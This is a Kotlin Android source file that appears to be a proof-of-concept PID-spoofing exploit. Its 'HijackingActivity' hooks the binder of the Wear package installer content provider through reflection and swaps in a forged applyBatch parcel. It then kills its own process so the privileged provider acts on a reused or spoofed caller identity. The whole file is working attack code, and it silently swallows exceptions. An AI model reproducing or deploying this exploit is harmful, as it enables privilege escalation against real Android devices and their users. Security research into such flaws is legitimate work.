package jp.plum.pidspoofing

import android.content.ContentProviderOperation
import android.content.IContentProvider
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.util.Log
import kotlinx.coroutines.*
import org.jetbrains.anko.button
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import kotlin.system.exitProcess

class HijackingActivity : AppCompatActivity() {
    companion object {
        private const val authority = "com.google.android.packageinstaller.wear.provider"
        private const val uri = "content://$authority"
        private const val limit = 2
        private val source = "a b c d e f g".split(" ")
        private val request = ContentProviderOperation.newDelete(Uri.parse(uri)).build()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        installResolver()
        verticalLayout {
            button("Apply Batch For PackageInstaller") {
                onClick {
                    // async run on Dispatchers.IO & swallow all exceptions
                    (GlobalScope + CoroutineExceptionHandler { _, _ -> }).launch(Dispatchers.IO) {
                        contentResolver.applyBatch(authority, arrayListOf(request))
                    }
                    Log.e(TAG, "commit applyBatch operation to package installer")
                    // ensure `applyBatch` already committed
                    delay(100L)
                    Log.e(
                        TAG,
                        "hijacker will quit this game from pid: ${Process.myPid()}"
                    )
                    exitProcess(0)
                }
            }
        }
    }

    private fun installResolver() {
        val proxy = contentResolver.acquireProvider(authority)
        val field = proxy.javaClass.getDeclaredField("mRemote")
        field.isAccessible = true
        val src = field.get(proxy) as IBinder
        val changed = installRemote(src)
        field.set(proxy, changed)
    }

    private fun installRemote(remote: IBinder) = object : IBinder by remote {
        override fun transact(
            code: Int,
            data: Parcel,
            reply: Parcel,
            flags: Int
        ) = when (code) {
            IContentProvider.APPLY_BATCH_TRANSACTION -> {
                Log.e(TAG, "begin transact")
                remote.transact(
                    code,
                    Ropes(
                        source,
                        limit,
                        intent.getIBinderExtra(MainActivity.Key)
                    ).buildParcel(
                        request, authority
                    ),
                    reply,
                    flags
                )
            }
            else -> remote.transact(code, data, reply, flags)
        }
    }
}